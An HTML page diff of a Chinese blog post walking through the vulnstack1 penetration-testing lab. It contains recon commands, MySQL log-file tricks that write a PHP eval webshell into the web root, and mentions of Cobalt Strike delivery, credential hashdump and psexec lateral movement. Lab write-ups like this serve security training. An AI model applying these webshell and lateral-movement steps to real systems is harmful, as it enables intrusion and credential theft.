@@ -1,0 +1,287 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>vulnstack1 | 1jzz</title>
+<link rel="shortcut icon" href="https://1jzz.github.io/favicon.ico?v=1659229140591">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://1jzz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="vulnstack1 | 1jzz - Atom Feed" href="https://1jzz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+开始水了。。。。。
+信息收集
+主机信息收集
+使用nmap进行无ping扫描
+nmap -Pn 192.168.6.0/24
+找到目标主机ip之后进行端口扫描
+nmap -sS -sV -T4 192.168.6.158
+结果：
+
+we..." />
+    <meta name="keywords" content="内网" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://1jzz.github.io">
+  <img class="avatar" src="https://1jzz.github.io/images/avatar.png?v=1659229140591" alt="">
+  </a>
+  <h1 class="site-title">
+    1jzz
+  </h1>
+  <p class="site-description">
+    当人生跌入谷底，剩下的每一步都是向上。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              vulnstack1
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-28
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://1jzz.github.io/tag/qrjUTseS5/" class="post-tag">
+                  # 内网
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="前言">前言</h1>
+<p>开始水了。。。。。</p>
+<h1 id="信息收集">信息收集</h1>
+<h2 id="主机信息收集">主机信息收集</h2>
+<p>使用nmap进行无ping扫描<br>
+<code>nmap -Pn 192.168.6.0/24</code><br>
+找到目标主机ip之后进行端口扫描<br>
+<code>nmap -sS -sV -T4 192.168.6.158</code><br>
+结果：</p>
+<ul>
+<li>web：80</li>
+<li>mysql：3306</li>
+</ul>
+<h2 id="目录扫描">目录扫描</h2>
+<p><code>direseache -u &quot;http://192.168.6.158&quot; -e *</code><br>
+结果：</p>
+<ul>
+<li>phpMyAdmin</li>
+<li>首页为phpstudy探针
+<ul>
+<li>没有开启safe_mode</li>
+<li>没有被禁用的函数(disable_function)</li>
+<li>web服务的绝对路径：C:/phpStudy/WWW</li>
+<li>服务器：windows7</li>
+</ul>
+</li>
+</ul>
+<h2 id="利用">利用</h2>
+<ul>
+<li>数据库是否能外连，进行爆破</li>
+<li>phpinfo探针中可以进行测试mysql账号密码，使用bp进行爆破</li>
+<li>phpMyAdmin写shell</li>
+<li>phpMyAdmin知道绝对路径包含日志文件</li>
+</ul>
+<h1 id="getshell">getshell</h1>
+<p>因为mysql的密码为弱口令root，可以通过尝试写shell来获取shell。</p>
+<h2 id="利用-2">利用</h2>
+<ol>
+<li>
+<p>先看是否有读写权限，<code>select @@secure_file_priv</code>，为NULL，代表没有读写权限<br>
+<img src="https://1jzz.github.io/post-images/1651155810967.png" alt="" loading="lazy"><br>
+如果有读写权限就可以直接写入shell：<code>select '&lt;?php eval($_POST[&quot;test&quot;]);?&gt;' into outfile &quot;C:/phpStudy/WWW&quot;;</code></p>
+</li>
+<li>
+<p>通过包含日志getshell</p>
+<ul>
+<li>general_log：日志保存状态</li>
+<li>general_log_file：日志保存路径<br>
+<img src="https://1jzz.github.io/post-images/1651155816156.png" alt="" loading="lazy"></li>
+</ul>
+</li>
+<li>
+<p>开启日志保存，并配置保存路径到web目录下</p>
+<ul>
+<li><code>set global general_log = &quot;ON&quot;;</code></li>
+<li><code>set global general_log_file = &quot;C:/phpStudy/WWW/testlog.php&quot;;</code></li>
+</ul>
+</li>
+<li>
+<p>通过日志写入一句话木马：<code>select '&lt;?php eval($_POST[&quot;test&quot;]);?&gt;'</code></p>
+</li>
+<li>
+<p>蚁剑连接，运行web程序的用户为administrator，执行CS powershell脚本上线</p>
+<ul>
+<li>Script Web Delivery</li>
+<li>Powershell Command</li>
+</ul>
+</li>
+</ol>
+<h1 id="横向移动">横向移动</h1>
+<ol>
+<li>因为已经是Administrator权限，进行hashdump，可以直接获取GOD\Administrator账户的明文密码以及NTLM Hash</li>
+<li>收集内网主机列表：<code>net view</code></li>
+<li>有了域管理员账号就可以直接，那么就可以直接使用psexec或者wmi进行横向移动了，这里直接使用CS的psexec(smb)进行横向移动</li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://1jzz.github.io/post-images/1651155821145.png" alt="" loading="lazy"></figure>
+<h1 id="其他利用">其他利用</h1>
+<ul>
+<li>YXCMS，后台弱口令，可以写入shell</li>
+<li>备份文件，可以获取YXCMS中数据库的密码，从而进入phpMyAdmin进行利用</li>
+</ul>
+<p>还有很多其他情况以及在被限制的情况下要如何突破，有些原理还需要仔细琢磨。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a>
+<ul>
+<li><a href="#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">主机信息收集</a></li>
+<li><a href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F">目录扫描</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8">利用</a></li>
+</ul>
+</li>
+<li><a href="#getshell">getshell</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8-2">利用</a></li>
+</ul>
+</li>
+<li><a href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8">横向移动</a></li>
+<li><a href="#%E5%85%B6%E4%BB%96%E5%88%A9%E7%94%A8">其他利用</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://1jzz.github.io/post/v03dRKVqo/">
+              <h3 class="post-title">
+                fastjson黑白名单、黑名单绕过
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  友链： <a href="https://www.cnblogs.com/sherlson/" target="_blank">sherlson</a>、<a href="https://cyberczy.github.io/" target="_blank">cyberczy</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4b50d1451bf48cde435f45724be67b3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <a class="rss" href="https://1jzz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
